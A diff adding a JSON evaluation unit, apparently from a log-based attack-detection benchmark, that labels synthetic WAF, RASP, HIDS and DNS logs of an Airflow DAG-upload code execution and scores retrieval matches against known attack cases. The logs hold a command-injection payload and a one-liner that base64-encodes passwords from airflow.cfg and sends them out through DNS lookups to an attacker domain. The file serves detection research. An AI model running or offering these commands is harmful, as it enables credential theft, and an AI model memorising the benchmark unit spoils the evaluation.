@@ -1,0 +1,272 @@
+{
+ "unit": 1031,
+ "gt": {
+  "gt_class": "new",
+  "gt_case": null,
+  "confidence": "high",
+  "needs_review": false,
+  "reason": "不属于已入库的 8 个案例家族"
+ },
+ "technique": "Apache Airflow 示例 DAG 解析 RCE（DagBag 反序列化）",
+ "sources": [
+  "waf",
+  "web",
+  "rasp",
+  "hids",
+  "dns",
+  "dns",
+  "dns"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-06-27 13:31:11",
+   "source": "waf",
+   "log_id": "WAF0383857",
+   "content": "/dags/upload POST dag_file=example_trigger.py&content=import os;os.system(\"id\") Mozilla/5.0 (Windows NT 10.0; ",
+   "event_id": "1031-WAF0383857"
+  },
+  {
+   "timestamp": "2026-06-27 13:31:12",
+   "source": "web",
+   "log_id": "WEB0386354",
+   "content": "/dags/upload POST dag_file=example_trigger.py&content=import os;os.system(\"id\") Mozilla/5.0 (Windows NT 10.0; ",
+   "event_id": "1031-WEB0386354"
+  },
+  {
+   "timestamp": "2026-06-27 13:31:14",
+   "source": "rasp",
+   "log_id": "RASP0424702",
+   "content": "https://app-python-55.ops-corp.com/dags/upload {\"dag_bag\": \"pickle\", \"cmd\": \"os.system\"} Mozilla/5.0 (Windows ",
+   "event_id": "1031-RASP0424702"
+  },
+  {
+   "timestamp": "2026-06-27 13:33:09",
+   "source": "hids",
+   "log_id": "HID0415992",
+   "content": "for l in $(grep -i pass /opt/airflow/airflow.cfg|base64|fold -w30); do nslookup $l.glmbcr-39d7.org; done for f",
+   "event_id": "1031-HID0415992"
+  },
+  {
+   "timestamp": "2026-06-29 23:39:09",
+   "source": "dns",
+   "log_id": "DNS0417211",
+   "content": "947e7e61.glmbcr-39d7.org A 203.0.113.63",
+   "event_id": "1031-DNS0417211"
+  },
+  {
+   "timestamp": "2026-06-29 23:39:57",
+   "source": "dns",
+   "log_id": "DNS0417215",
+   "content": "2f900c57.glmbcr-39d7.org A 10.10.42.115",
+   "event_id": "1031-DNS0417215"
+  },
+  {
+   "timestamp": "2026-06-29 23:41:06",
+   "source": "dns",
+   "log_id": "DNS0417221",
+   "content": "33caf0ce.glmbcr-39d7.org A 10.10.25.107",
+   "event_id": "1031-DNS0417221"
+  }
+ ],
+ "retrieval_full": [
+  {
+   "case_id": "CASE-002",
+   "name": "Tomcat PUT 上传 JSP webshell + DNS C2 心跳",
+   "summary": "PUT 方法把 JSP webshell 写入上传目录 → 应用侧记录 webshell 上传与 exec 标记 → Tomcat 进程派生子 shell 执行探针 → 数小时后 DGA 风格域名突发解析。",
+   "matched_steps": 1,
+   "detected_steps": 1,
+   "total_steps": 4,
+   "shape": "middle",
+   "longest_run": 1,
+   "tier": "weak",
+   "order_ok": true,
+   "order_assessable": true,
+   "source_fit_ratio": 1.0,
+   "evidence": [
+    {
+     "step_id": "S4",
+     "action_id": "dga_hex_subdomain_beacon",
+     "label": "DGA 风格子域突发解析",
+     "generic": true,
+     "event_ids": [
+      "1031-DNS0417211",
+      "1031-DNS0417215",
+      "1031-DNS0417221"
+     ],
+     "sources": [
+      "dns"
+     ],
+     "aligned_event_id": "1031-DNS0417221",
+     "detections": [
+      {
+       "event_id": "1031-DNS0417211",
+       "source": "dns",
+       "timestamp": "2026-06-29 23:39:09"
+      },
+      {
+       "event_id": "1031-DNS0417215",
+       "source": "dns",
+       "timestamp": "2026-06-29 23:39:57"
+      },
+      {
+       "event_id": "1031-DNS0417221",
+       "source": "dns",
+       "timestamp": "2026-06-29 23:41:06"
+      }
+     ]
+    }
+   ],
+   "source_mismatches": [],
+   "unaligned_detections": [
+    {
+     "event_id": "1031-DNS0417211",
+     "step_id": "S4",
+     "action_id": "dga_hex_subdomain_beacon",
+     "source": "dns",
+     "timestamp": "2026-06-29 23:39:09",
+     "reason": "extra_detection_for_S4"
+    },
+    {
+     "event_id": "1031-DNS0417215",
+     "step_id": "S4",
+     "action_id": "dga_hex_subdomain_beacon",
+     "source": "dns",
+     "timestamp": "2026-06-29 23:39:57",
+     "reason": "extra_detection_for_S4"
+    }
+   ],
+   "keyword_score": 0,
+   "keyword_details": [],
+   "mitre": [
+    "T1190",
+    "T1505.003",
+    "T1071.004"
+   ],
+   "unobserved_steps": [
+    "S1",
+    "S2",
+    "S3"
+   ],
+   "before_steps": [
+    "S1",
+    "S2",
+    "S3"
+   ],
+   "gap_steps": [],
+   "predict_next": null,
+   "matched_non_generic_steps": 0,
+   "pattern_scope": {
+    "attack_family": "Tomcat 任意文件上传（PUT）+ DNS C2",
+    "variant_note": "单样本归纳；webshell 落地路径与 C2 域名均来自该样本，变体形态未验证。"
+   },
+   "negative_and_unknown_evidence": {
+    "not_observed": [
+     "横向移动",
+     "数据外带内容",
+     "持久化"
+    ],
+    "interpretation": "未观察到不等同于确认不存在；需结合日志覆盖范围判断。"
+   },
+   "provenance": {
+    "observation_count": 1,
+    "evidence_status": "single_observation_demo",
+    "observation_count_note": "由 dataset 每类第 1 个 unit 作为首批代表样本入库；原始行保存在 raw_logs.csv。"
+   }
+  },
+  {
+   "case_id": "CASE-001",
+   "name": "Log4Shell JNDI 注入（LDAP 回连 + Base64 命令执行）",
+   "summary": "Web 参数注入 ${jndi:ldap://…} → 应用侧 JNDI 解析并回连攻击者 LDAP → 主机侧 java 进程派生子 shell 执行命令。",
+   "matched_steps": 0,
+   "detected_steps": 0,
+   "total_steps": 3,
+   "shape": "none",
+   "longest_run": 0,
+   "tier": "keyword_only",
+   "order_ok": false,
+   "order_assessable": false,
+   "source_fit_ratio": 0.0,
+   "evidence": [],
+   "source_mismatches": [],
+   "unaligned_detections": [],
+   "keyword_score": 3,
+   "keyword_details": [
+    "keyword +3: base64"
+   ],
+   "mitre": [
+    "T1190",
+    "T1059.004",
+    "T1105"
+   ],
+   "unobserved_steps": [
+    "S1",
+    "S2",
+    "S3"
+   ],
+   "before_steps": [],
+   "gap_steps": [],
+   "predict_next": null,
+   "matched_non_generic_steps": 0,
+   "pattern_scope": {
+    "attack_family": "Log4j2 JNDI 注入（CVE-2021-44228）",
+    "variant_note": "由单个合成样本归纳；RMI/DNS 协议变体与二次载荷形式尚未多实例验证。"
+   },
+   "negative_and_unknown_evidence": {
+    "not_observed": [
+     "横向移动",
+     "凭据窃取",
+     "反序列化回显"
+    ],
+    "interpretation": "未观察到不等同于确认不存在；需结合日志覆盖范围判断。"
+   },
+   "provenance": {
+    "observation_count": 1,
+    "evidence_status": "single_observation_demo",
+    "observation_count_note": "由 dataset 每类第 1 个 unit 作为首批代表样本入库；原始行保存在 raw_logs.csv。"
+   }
+  }
+ ],
+ "evidence_for_agent": {
+  "tier": "weak",
+  "shape": "middle",
+  "matched_steps": 1,
+  "total_steps": 4,
+  "order_ok": true,
+  "order_assessable": true,
+  "source_fit_ratio": 1.0,
+  "steps": [
+   {
+    "step_id": "S4",
+    "label": "DGA 风格子域突发解析",
+    "sources": [
+     "dns"
+    ],
+    "generic": true,
+    "event_ids": [
+     "1031-DNS0417211",
+     "1031-DNS0417215",
+     "1031-DNS0417221"
+    ]
+   }
+  ],
+  "unobserved_steps": [
+   "S1",
+   "S2",
+   "S3"
+  ],
+  "gap_steps": [],
+  "before_steps": [
+   "S1",
+   "S2",
+   "S3"
+  ],
+  "predict_next": null,
+  "source_mismatches": [],
+  "keyword_score": 0,
+  "mitre": [
+   "T1190",
+   "T1505.003",
+   "T1071.004"
+  ]
+ }
+}
